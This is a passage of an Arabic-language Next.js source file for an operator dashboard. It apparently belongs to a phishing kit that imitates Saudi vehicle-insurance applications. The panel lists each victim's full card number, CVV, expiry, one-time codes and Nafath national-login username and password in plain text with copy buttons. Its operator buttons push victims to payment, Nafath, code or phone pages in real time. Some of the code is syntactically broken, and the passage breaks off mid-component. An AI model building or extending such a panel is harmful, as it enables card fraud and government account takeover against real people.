"use client"
import { useState, useEffect, useMemo, useRef, useCallback } from "react"
import type React from "react"

import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Flag, Bell, LogOut, Search, Calendar, Download, Settings, User, Menu, ChevronRight, FileText, Shield, Key, UserX, Eye, Copy, Phone, MessageSquare, MoreVertical, Filter, X, Wifi, Smartphone, Hash, IceCream, LockIcon, GripVertical, Activity, TrendingUp, Clock, CheckCircle2, AlertCircle, Zap } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { formatDistanceToNow } from "date-fns"
import { ar } from "date-fns/locale"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { collection, doc, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database, auth, db } from "@/lib/firestore"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
  DropdownMenuLabel,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { useToast } from "@/hooks/use-toast"
import { ScrollArea } from "@/components/ui/scroll-area"

// Types
type FlagColor = "red" | "yellow" | "green" | null

function ResizeHandle({
  onMouseDown,
  isResizing,
}: {
  onMouseDown: (React.MouseEvent) => void
  isResizing: boolean
}) {
  return (
    <div
      className={`w-1 bg-border hover:bg-primary/50 cursor-col-resize transition-colors relative group ${
        isResizing ? "bg-primary" : ""
      }`}
      onMouseDown={onMouseDown}
    >
      <div className="absolute inset-y-0 -left-1 -right-1 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
        <div className="bg-background border rounded p-1 shadow-sm">
          <GripVertical className="h-3 w-3 text-muted-foreground" />
        </div>
      </div>
    </div>
  )
}

// Custom Hooks
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })
    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

function useResizable(initialWidth: number, minWidth: number, maxWidth: number) {
  const [width, setWidth] = useState(initialWidth)
  const [isResizing, setIsResizing] = useState(false)
  const startX = useRef(0)
  const startWidth = useRef(0)

  const handleMouseDown = useCallback(
    (e: React.MouseEvent) => {
      setIsResizing(true)
      startX.current = e.clientX
      startWidth.current = width
      e.preventDefault()
    },
    [width],
  )

  const handleMouseMove = useCallback(
    (e: MouseEvent) => {
      if (!isResizing) return

      const deltaX = e.clientX - startX.current
      const newWidth = startWidth.current + deltaX

      if (newWidth >= minWidth && newWidth <= maxWidth) {
        setWidth(newWidth)
      }
    },
    [isResizing, minWidth, maxWidth],
  )

  const handleMouseUp = useCallback(() => {
    setIsResizing(false)
  }, [])

  useEffect(() => {
    if (isResizing) {
      document.addEventListener("mousemove", handleMouseMove)
      document.addEventListener("mouseup", handleMouseUp)
      document.body.style.cursor = "col-resize"
      document.body.style.userSelect = "none"

      return () => {
        document.removeEventListener("mousemove", handleMouseMove)
        document.removeEventListener("mouseup", handleMouseUp)
        document.body.style.cursor = ""
        document.body.style.userSelect = ""
      }
    }
  }, [isResizing, handleMouseMove, handleMouseUp])

  return {
    width,
    isResizing,
    handleMouseDown,
  }
}

// Components
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <div
      className={`h-3 w-3 rounded-full ${
        status === "online"
          ? "bg-emerald-500 animate-pulse shadow-lg shadow-emerald-500/50"
          : status === "offline"
            ? "bg-gray-400"
            : "bg-amber-400 animate-pulse"
      }`}
    />
  )
}

function NafazStatus({ notification }: { notification: any }) {
  if (!notification.nafadUsername) {
    return null
  }

  const getStatusConfig = () => {
    switch (notification.nafazStatus) {
      case "verified":
        return {
          color: "bg-emerald-500",
          text: "مؤكد",
        }
      case "failed":
        return {
          color: "bg-red-500",
          text: "فشل",
        }
      default:
        return {
          color: "bg-amber-500",
          text: "معلق",
        }
    }
  }

  const config = getStatusConfig()

  return <div className={`h-2 w-2 rounded-full ${config.color}`} title={`نفاذ: ${config.text}`} />
}

function StatisticsCard({ title, value, icon: Icon, color, trend }: {
  title: string
  value: number
  icon: any
  color: string
  trend?: { value: number; isPositive: boolean }
}) {
  return (
    <Card className="relative overflow-hidden border-0 shadow-sm hover:shadow-md transition-all duration-200 bg-gradient-to-br from-card to-card/50">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${
            color === "emerald"
              ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
              : color === "blue"
                ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
                : color === "cyan"
                  ? "bg-cyan-100 text-cyan-600 dark:bg-cyan-900/30 dark:text-cyan-400"
                  : color === "purple"
                    ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
                    : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
          }`}>
            <Icon className="h-6 w-6" />
          </div>
          {trend && (
            <div className={`flex items-center gap-1 text-sm font-medium ${
              trend.isPositive ? "text-emerald-600 dark:text-emerald-400" : "text-red-600 dark:text-red-400"
            }`}>
              <TrendingUp className={`h-4 w-4 ${trend.isPositive ? "" : "rotate-180"}`} />
              {Math.abs(trend.value)}%
            </div>
          )}
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="space-y-1">
          <p className="text-3xl font-bold text-foreground">{value.toLocaleString()}</p>
          <p className="text-sm text-muted-foreground font-medium">{title}</p>
        </div>
      </CardContent>
    </Card>
  )
}

function NotificationCard({
  notification,
  isSelected,
  onClick,
  onFlagChange,
  onCurrentPageUpdate,
}: {
  notification: any
  isSelected: boolean
  onClick: () => void
  onFlagChange: (id: string, color: FlagColor) => void
  onCurrentPageUpdate: (id: string, currentPage: string) => void
}) {
  const getCardBackground = () => {
    if (notification.flagColor) {
      const colorMap: Record<NonNullable<any>, string> = {
        red: "border-l-4 border-red-500 bg-gradient-to-r from-red-50/80 to-transparent dark:from-red-900/20",
        yellow: "border-l-4 border-yellow-500 bg-gradient-to-r from-yellow-50/80 to-transparent dark:from-yellow-900/20",
        green: "border-l-4 border-green-500 bg-gradient-to-r from-green-50/80 to-transparent dark:from-green-900/20",
      }
      return colorMap[notification.flagColor]
    }

    if (notification.cardNumber) {
      return "border-l-4 border-emerald-500 bg-gradient-to-r from-emerald-50/80 to-transparent dark:from-emerald-900/20"
    }
    if (notification.nafadUsername) {
      return "border-l-4 border-purple-500 bg-gradient-to-r from-purple-50/80 to-transparent dark:from-purple-900/20"
    }
    if (notification.phone || notification.phone2) {
      return "border-l-4 border-blue-500 bg-gradient-to-r from-blue-50/80 to-transparent dark:from-blue-900/20"
    }

    return "border-l-4 border-transparent hover:border-l-primary/30"
  }

  const getPrimaryInfo = () => {
    if (notification.documment_owner_full_name) {
      return notification.documment_owner_full_name
    }
    if (notification.phone) {
      return notification.phone
    }
    if (notification.phone2) {
      return notification.phone2
    }
    if (notification.nafadUsername) {
      return notification.nafadUsername
    }
    return "مستخدم جديد"
  }

  const getSecondaryInfo = () => {
    const info = []
    if (notification.country) info.push(notification.country)
    if (notification.operator) info.push(notification.operator)
    if (notification.currentPage) info.push(`صفحة: ${notification.currentPage}`)
    if (notification.cardNumber) info.push("بطاقة")
    if (notification.nafadUsername) info.push("نفاذ")
    if (notification.phone2) info.push("هاتف ثاني")
    if (notification.phoneOtpCode) info.push("OTP هاتف")
    if (notification.otp || notification.otpCode) info.push("OTP")
    return info.join(" • ")
  }

  return (
    <div
      className={`group p-4 border-b border-border/30 cursor-pointer transition-all duration-300 hover:bg-muted/40 hover:shadow-sm ${
        isSelected ? "bg-primary/5 border-r-4 border-r-primary shadow-sm" : ""
      } ${getCardBackground()}`}
      onClick={onClick}
    >
      <div className="flex items-start gap-4">
        {/* Enhanced Avatar with status indicator */}
        <div className="relative flex-shrink-0">
          <Avatar className="h-12 w-12 border-2 border-background shadow-md ring-2 ring-primary/10">
            <AvatarImage src="/placeholder.svg?height=48&width=48" />
            <AvatarFallback className="bg-gradient-to-br from-primary/20 to-accent/20 text-primary font-bold text-sm">
              {getPrimaryInfo().slice(0, 2).toUpperCase()}
            </AvatarFallback>
          </Avatar>
          <div className="absolute -bottom-1 -right-1">
            <UserStatus userId={notification.id} />
          </div>
          {notification.nafadUsername && (
            <div className="absolute -top-1 -right-1">
              <NafazStatus notification={notification} />
            </div>
          )}
        </div>

        {/* Content */}
        <div className="flex-1 min-w-0 space-y-2">
          <div className="flex items-start justify-between gap-2">
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-foreground truncate text-base">
                {getPrimaryInfo()}
              </h3>
              <p className="text-sm text-muted-foreground mt-1 line-clamp-2">
                {getSecondaryInfo()}
              </p>
            </div>
            
            {/* Time and actions */}
            <div className="flex items-center gap-2 flex-shrink-0">
              <div className="text-xs text-muted-foreground flex items-center gap-1">
                <Clock className="h-3 w-3" />
                {notification.createdDate &&
                  formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })}
              </div>
              
              {/* Flag dropdown */}
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity"
                  >
                    <Flag className={`h-4 w-4 ${
                      notification.flagColor === "red" ? "text-red-500 fill-red-500" :
                      notification.flagColor === "yellow" ? "text-yellow-500 fill-yellow-500" :
                      notification.flagColor === "green" ? "text-green-500 fill-green-500" :
                      "text-muted-foreground"
                    }`} />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-32">
                  <DropdownMenuItem onClick={() => onFlagChange(notification.id, "red")}>
                    <Flag className="h-4 w-4 text-red-500 fill-red-500 mr-2" />
                    أحمر
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => onFlagChange(notification.id, "yellow")}>
                    <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500 mr-2" />
                    أصفر
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => onFlagChange(notification.id, "green")}>
                    <Flag className="h-4 w-4 text-green-500 fill-green-500 mr-2" />
                    أخضر
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => onFlagChange(notification.id, null)}>
                    <X className="h-4 w-4 mr-2" />
                    إزالة
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>

          {/* Status badges */}
          <div className="flex items-center gap-2 flex-wrap">
            {notification.cardNumber && (
              <Badge variant="secondary" className="bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-400 text-xs">
                <CreditCard className="h-3 w-3 mr-1" />
                بطاقة
              </Badge>
            )}
            {notification.nafadUsername && (
              <Badge variant="secondary" className="bg-purple-100 text-purple-700 dark:bg-purple-900/30 dark:text-purple-400 text-xs">
                <Shield className="h-3 w-3 mr-1" />
                نفاذ
              </Badge>
            )}
            {(notification.phone || notification.phone2) && (
              <Badge variant="secondary" className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400 text-xs">
                <Phone className="h-3 w-3 mr-1" />
                هاتف
              </Badge>
            )}
            {notification.phoneOtpCode && (
              <Badge variant="secondary" className="bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400 text-xs">
                <Key className="h-3 w-3 mr-1" />
                OTP
              </Badge>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

function NotificationDetails({
  notification,
  onClose,
  onCurrentPageUpdate,
  onAuthNumberUpdate,
}: {
  notification: any | null
  onClose: () => void
  onCurrentPageUpdate?: (id: string, currentPage: string) => void
  onAuthNumberUpdate?: (id: string, authNumber: string) => void
}) {
  const [activeTab, setActiveTab<"personal" | "card" | "nafaz" | "phone">("personal")
  const [editingCurrentPage, setEditingCurrentPage] = useState(false)
  const [currentPageValue, setCurrentPageValue] = useState("")
  const [editingAuthNumber, setEditingAuthNumber] = useState(false)
  const [authNumberValue, setAuthNumberValue] = useState("")

  useEffect(() => {
    if (notification?.currentPage) {
      setCurrentPageValue(notification.currentPage)
    }
    if (notification?.nafaz_pin) {
      setAuthNumberValue(notification.nafaz_pin)
    }
  }, [notification])

  const handleCurrentPageSave = () => {
    if (notification && onCurrentPageUpdate && currentPageValue.trim()) {
      onCurrentPageUpdate(notification.id, currentPageValue.trim())
      setEditingCurrentPage(false)
    }
  }

  const handleAuthNumberSave = () => {
    if (notification && onAuthNumberUpdate && authNumberValue.trim()) {
      onAuthNumberUpdate(notification.id, authNumberValue.trim())
      setEditingAuthNumber(false)
    }
  }

  if (!notification) {
    return (
      <div className="flex-1 flex items-center justify-center bg-muted/20">
        <div className="text-center space-y-4">
          <div className="bg-muted/50 rounded-full p-6 mx-auto w-fit">
            <MessageSquare className="h-12 w-12 text-muted-foreground" />
          </div>
          <div>
            <h3 className="text-lg font-semibold text-foreground mb-2">اختر إشعاراً لعرض التفاصيل</h3>
            <p className="text-sm text-muted-foreground">انقر على أي إشعار من القائمة لعرض معلوماته التفصيلية</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="flex-1 flex flex-col bg-background">
      {/* Header */}
      <div className="p-4 border-b bg-muted/20 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Button variant="ghost" size="icon" className="lg:hidden" onClick={onClose}>
            <ChevronRight className="h-5 w-5" />
          </Button>
          <Avatar className="h-10 w-10">
            <AvatarImage src="/placeholder.svg?height=40&width=40" />
            <AvatarFallback className="bg-primary/20 text-primary font-semibold">
              {(notification.documment_owner_full_name || notification.phone || notification.phone2 || "مستخدم")
                .slice(0, 2)
                .toUpperCase()}
            </AvatarFallback>
          </Avatar>
          <div>
            <h2 className="font-semibold text-foreground">
              {notification.documment_owner_full_name || notification.phone || notification.phone2 || "مستخدم جديد"}
            </h2>
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <span>{notification.country}</span>
              {notification.operator && (
                <>
                  <span>•</span>
                  <span>{notification.operator}</span>
                </>
              )}
              {notification.currentPage && (
                <>
                  <span>•</span>
                  <div className="flex items-center gap-1">
                    <span>صفحة: {notification.currentPage}</span>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-4 w-4 opacity-60 hover:opacity-100"
                      onClick={() => setEditingCurrentPage(true)}
                    >
                      <Settings className="h-3 w-3" />
                    </Button>
                  </div>
                </>
              )}
              <span>•</span>
              <span>
                {notification.createdDate &&
                  formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })}
              </span>
            </div>
          </div>
        </div>
        <div className="hidden p-4 rounded-md sm:block">
          <Button
            title="معلومات"
            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "1")}
            variant={notification.currentPage === "1" ? "default" : "ghost"}
            size="icon"
          >
            <FileText className="h-5 w-5" />
          </Button>
          <Button
            title="دفع"
            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "6")}
            variant={notification.currentPage === "6" ? "default" : "ghost"}
            size="icon"
          >
            <CreditCard className="h-5 w-5" />
          </Button>
          <Button
            title="نفاذ"
            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "nafaz")}
            variant={notification.currentPage === "8888" ? "default" : "ghost"}
            size="icon"
          >
            <Shield className="h-5 w-5" />
          </Button>
          <Button
            title="كود"
            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "7")}
            variant={notification.currentPage === "7" ? "default" : "ghost"}
            size="icon"
          >
            <LockIcon className="h-5 w-5" />
          </Button>
          <Button
            title="هاتف"
            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "9999")}
            variant={notification.currentPage === "9999" ? "default" : "ghost"}
            size="icon"
          >
            <Phone className="h-5 w-5" />
          </Button>
        </div>
        <div className="flex items-center gap-2">
          <UserStatus userId={notification.id} />
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="icon">
                <MoreVertical className="h-5 w-5" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end">
              <DropdownMenuItem>
                <Flag className="h-4 w-4 mr-2" />
                تعيين علم
              </DropdownMenuItem>
              <DropdownMenuItem>
                <Download className="h-4 w-4 mr-2" />
                تصدير البيانات
              </DropdownMenuItem>
              <DropdownMenuSeparator />
              <DropdownMenuItem className="text-red-600">
                <Trash2 className="h-4 w-4 mr-2" />
                إخفاء الإشعار
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </div>

      {/* Current Page Edit Dialog */}
      {editingCurrentPage && (
        <div
          className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
          onClick={() => setEditingCurrentPage(false)}
        >
          <div
            className="bg-background p-6 rounded-lg shadow-lg w-96 max-w-[90vw]"
            onClick={(e) => e.stopPropagation()}
          >
            <h3 className="text-lg font-semibold mb-4">تحديث الصفحة الحالية</h3>
            <div className="space-y-4">
              <div>
                <label className="text-sm font-medium text-muted-foreground">الصفحة الحالية</label>
                <Input
                  value={currentPageValue}
                  onChange={(e) => setCurrentPageValue(e.target.value)}
                  placeholder="أدخل اسم الصفحة الحالية"
                  className="mt-1"
                />
              </div>
              <div className="flex gap-2 justify-end">
                <Button variant="outline" onClick={() => setEditingCurrentPage(false)}>
                  إلغاء
                </Button>
                <Button onClick={handleCurrentPageSave} disabled={!currentPageValue.trim()}>
                  حفظ
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Auth Number Edit Dialog */}
      {editingAuthNumber && (
        <div
          className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
          onClick={() => setEditingAuthNumber(false)}
        >
          <div
            className="bg-background p-6 rounded-lg shadow-lg w-96 max-w-[90vw]"
            onClick={(e) => e.stopPropagation()}
          >
            <h3 className="text-lg font-semibold mb-4">تحديث رقم التحقق (Auth Number)</h3>
            <div className="space-y-4">
              <div>
                <label className="text-sm font-medium text-muted-foreground">رقم التحقق</label>
                <Input
                  value={authNumberValue}
                  onChange={(e) => setAuthNumberValue(e.target.value)}
                  placeholder="أدخل رقم التحقق"
                  className="mt-1"
                />
              </div>
              <div className="flex gap-2 justify-end">
                <Button variant="outline" onClick={() => setEditingAuthNumber(false)}>
                  إلغاء
                </Button>
                <Button onClick={handleAuthNumberSave} disabled={!authNumberValue.trim()}>
                  حفظ
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tabs */}
      <div className="border-b">
        <div className="flex">
          {[
            {
              id: "personal",
              label: "المعلومات الشخصية",
              icon: User,
              hasData: notification.documment_owner_full_name || notification.owner_identity_number,
            },
            {
              id: "phone",
              label: "الهاتف",
              icon: Smartphone,
              hasData: notification.phone || notification.phone2 || notification.phoneOtpCode,
            },
            {
              id: "card",
              label: "البطاقة",
              icon: CreditCard,
              hasData: notification.cardNumber,
            },
            {
              id: "nafaz",
              label: "نفاذ",
              icon: Key,
              hasData: notification.nafadUsername,
            },
          ].map((tab) => (
            <button
              key={tab.id}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 text-sm font-medium border-b-2 transition-colors ${
                activeTab === tab.id
                  ? "border-primary text-primary bg-primary/5"
                  : "border-transparent text-muted-foreground hover:text-foreground hover:bg-muted/50"
              }`}
              onClick={() => setActiveTab(tab.id as any)}
            >
              <tab.icon className="h-4 w-4" />
              <span className="hidden sm:inline">{tab.label}</span>
              {tab.hasData && <div className="h-2 w-2 rounded-full bg-primary" />}
            </button>
          ))}
        </div>
      </div>

      {/* Content */}
      <ScrollArea className="flex-1">
        <div className="p-4 space-y-4">
          {activeTab === "personal" && (
            <div className="space-y-3 bg-blue-50/50 ">
              {[
                {
                  label: "اسم مالك الوثيقة",
                  value: notification.documment_owner_full_name,
                  icon: User,
                },
                {
                  label: "رقم هوية المالك",
                  value: notification.owner_identity_number,
                  icon: Shield,
                },
                {
                  label: "رقم هوية المشتري",
                  value: notification.buyer_identity_number,
                  icon: Shield,
                },
                {
                  label: "رقم هوية البائع",
                  value: notification.seller_identity_number,
                  icon: Shield,
                },
                {
                  label: "الرقم التسلسلي",
                  value: notification.serial_number,
                  icon: FileText,
                },
                {
                  label: "رقم تصنيع المركبة",
                  value: notification.vehicle_manufacture_number,
                  icon: FileText,
                },
                {
                  label: "الرقم التسلسل",
                  value: notification.sequenceNumber,
                  icon: FileText,
                },
                {
                  label: "الصفحة الحالية",
                  value: notification.currentPage,
                  icon: FileText,
                },
                {
                  label: "غرض التأمين",
                  value: notification.insurance_purpose === "renewal" ? "تجديد" : "نقل ملكية",
                  icon: Shield,
                },
                {
                  label: "نوع المركبة",
                  value:
                    notification.vehicle_type === "registration"
                      ? "تسجيل"
                      : notification.vehicle_type === "customs"
                        ? "جمارك"
                        : "رقم تسلسلي",
                  icon: FileText,
                },
                {
                  label: "حالة الدفع",
                  value:
                    notification.paymentStatus === "completed"
                      ? "مكتمل"
                      : notification.paymentStatus === "pending"
                        ? "معلق"
                        : notification.paymentStatus,
                  icon: CreditCard,
                },
                {
                  label: "تاريخ بداية البوليصة",
                  value: notification.policyStartDate,
                  icon: Calendar,
                },
                {
                  label: "عرض التأمين المحدد",
                  value: notification.selectedInsuranceOffer,
                  icon: Shield,
                },
              ].map(
                (item) =>
                  item.value && (
                    <Card key={item.label} className="border-muted/50">
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <item.icon className="h-4 w-4 text-muted-foreground" />
                            <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="text-sm font-semibold text-foreground">{item.value}</span>
                            <Button variant="ghost" size="icon" className="h-6 w-6">
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ),
              )}
            </div>
          )}

          {activeTab === "phone" && (
            <div className="space-y-3">
              <Card className="border-blue-200 bg-blue-50/50 dark:border-blue-800 dark:bg-blue-900/20">
                <CardContent className="p-4">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="bg-blue-100 p-2 rounded-lg dark:bg-blue-900/30">
                      <Smartphone className="h-5 w-5 text-blue-600 dark:text-blue-400" />
                    </div>
                    <div>
                      <h3 className="font-semibold text-blue-900 dark:text-blue-100">معلومات الهاتف</h3>
                      <p className="text-xs text-blue-700 dark:text-blue-300">أرقام الهاتف ومعلومات الشبكة</p>
                    </div>
                  </div>
                  <div className="space-y-3">
                    {[
                      {
                        label: "رقم الهاتف الأساسي",
                        value: notification.phone,
                        icon: Phone,
                      },
                      {
                        label: "رقم الهاتف الثاني",
                        value: notification.phone2,
                        icon: Smartphone,
                      },
                      {
                        label: "معلومات الشبكة",
                        value: notification.operator,
                        icon: Wifi,
                      },
                      {
                        label: "رمز التحقق للهاتف",
                        value: notification.phoneOtpCode,
                        icon: Hash,
                      },
                    ].map(
                      (item) =>
                        item.value && (
                          <Card key={item.label} className="border-muted/50">
                            <CardContent className="p-4">
                              <div className="flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                  <item.icon className="h-4 w-4 text-muted-foreground" />
                                  <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                                </div>
                                <div className="flex items-center gap-2">
                                  <Badge
                                    variant="secondary"
                                    className={`font-mono text-sm ${
                                      item.label.includes("رمز التحقق")
                                        ? "bg-orange-100 text-orange-700 border-orange-200"
                                        : item.label.includes("شبكة")
                                          ? "bg-cyan-100 text-cyan-700 border-cyan-200"
                                          : "bg-blue-100 text-blue-700 border-blue-200"
                                    }`}
                                  >
                                    {item.value}
                                  </Badge>
                                  <Button variant="ghost" size="icon" className="h-6 w-6">
                                    <Copy className="h-3 w-3" />
                                  </Button>
                                </div>
                              </div>
                            </CardContent>
                          </Card>
                        ),
                    )}

                    <div
                      className="bg-background p-6 rounded-lg shadow-lg w-96 max-w-[90vw]"
                      onClick={(e) => e.stopPropagation()}
                    >
                      <h3 className="text-lg font-semibold mb-4">تحديث رقم التحقق (Auth Number)</h3>
                      <div className="space-y-4">
                        <div>
                          <label className="text-sm font-medium text-muted-foreground">رقم التحقق</label>
                          <Input
                            value={authNumberValue}
                            onChange={(e) => setAuthNumberValue(e.target.value)}
                            placeholder="أدخل رقم التحقق"
                            className="mt-1"
                          />
                        </div>
                        <div className="flex gap-2 justify-end">
                          <Button variant="outline" onClick={() => setEditingAuthNumber(false)}>
                            إلغاء
                          </Button>
                          <Button onClick={handleAuthNumberSave} disabled={!authNumberValue.trim()}>
                            حفظ
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
              {!notification.phone && !notification.phone2 && !notification.phoneOtpCode && !notification.operator && (
                <div className="text-center py-8">
                  <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
                    <Phone className="h-8 w-8 text-muted-foreground" />
                  </div>
                  <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات هاتف</p>
                  <p className="text-xs text-muted-foreground">لم يتم تسجيل أي معلومات هاتف لهذا المستخدم</p>
                </div>
              )}
            </div>
          )}

          {activeTab === "card" && (
            <div className="space-y-3 p-1 ">
              <Card>
                <CardContent className=" bg-green-100 border-blue-200 dark:border-blue-800 dark:bg-blue-900/20">
                  {[
                    {
                      label: "رقم البطاقة",
                      value: notification.cardNumber,
                      icon: CreditCard,
                    },
                    {
                      label: "تاريخ الانتهاء",
                      value:
                        notification.cardMonth && notification.cardYear
                          ? `${notification.cardMonth}/${notification.cardYear}`
                          : null,
                      icon: Calendar,
                    },
                    {
                      label: "رمز الامان (CVV)",
                      value: notification.cvv,
                      icon: Shield,
                    },
                    {
                      label: "رمز التحقق (OTP)",
                      value: notification.otp || notification.otpCode,
                      icon: Shield,
                    },
                    {
                      label: "جميع الرموز",
                      value: notification.allOtps?.join(""),
                      icon: Shield,
                    },
                  ].map(
                    (item) =>
                      item.value && (
                        <Card key={item.label} className="border-muted/50">
                          <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-3">
                                <item.icon className="h-4 w-4 text-muted-foreground" />
                                <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <Badge variant="secondary" className="font-mono text-sm">
                                  {item.value}
                                </Badge>
                                <Button variant="ghost" size="icon" className="h-6 w-6">
                                  <Copy className="h-3 w-3" />
                                </Button>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ),
                  )}
                  {!notification.cardNumber && (
                    <div className="text-center py-8">
                      <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
                        <CreditCard className="h-8 w-8 text-muted-foreground" />
                      </div>
                      <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات بطاقة</p>
                      <p className="text-xs text-muted-foreground">لم يتم تسجيل معلومات بطاقة لهذا المستخدم</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "nafaz" && (
            <div className="space-y-3">
              {notification.nafadUsername ? (
                <>
                  <Card className="border-purple-200 bg-purple-50/50 dark:border-purple-800 dark:bg-purple-900/20">
                    <CardContent className="p-4">
                      <div className="flex items-center gap-3 mb-4">
                        <div className="bg-purple-100 p-2 rounded-lg dark:bg-purple-900/30">
                          <Key className="h-5 w-5 text-purple-600 dark:text-purple-400" />
                        </div>
                        <div>
                          <h3 className="font-semibold text-purple-900 dark:text-purple-100">
                            بيانات تسجيل الدخول نفاذ
                          </h3>
                          <p className="text-xs text-purple-700 dark:text-purple-300">
                            معلومات الدخول المستخدمة في نظام نفاذ
                          </p>
                        </div>
                      </div>
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium text-muted-foreground">اسم المستخدم</span>
                          <div className="flex items-center gap-2">
                            <span className="text-sm font-semibold font-mono">{notification.nafadUsername}</span>
                            <Button variant="ghost" size="icon" className="h-6 w-6">
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                        {notification.nafadPassword && (
                          <div className="flex items-center justify-between">
                            <span className="text-sm font-medium text-muted-foreground">كلمة المرور</span>
                            <div className="flex items-center gap-2">
                              <span className="text-sm font-semibold font-mono">{notification?.nafadPassword}</span>
                              <Button variant="ghost" size="icon" className="h-6 w-6">
                                <Eye className="h-3 w-3" />
                              </Button>
                              <Button variant="ghost" size="icon" className="h-6 w-6">
                                <Copy className="h-3 w-3" />
                              </Button>
                            </div>
                          </div>
                        )}
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium text-muted-foreground">حالة التحقق</span>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  {/* New Card for Auth Number in Nafaz tab */}
                  <Card className="border-muted/50">
                    <CardContent className="p-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <Hash className="h-4 w-4 text-muted-foreground" />
                          <span className="text-sm font-medium text-muted-foreground">رقم التحقق (Auth Number)</span>
                        </div>
                        <div className="flex items-center gap-2">
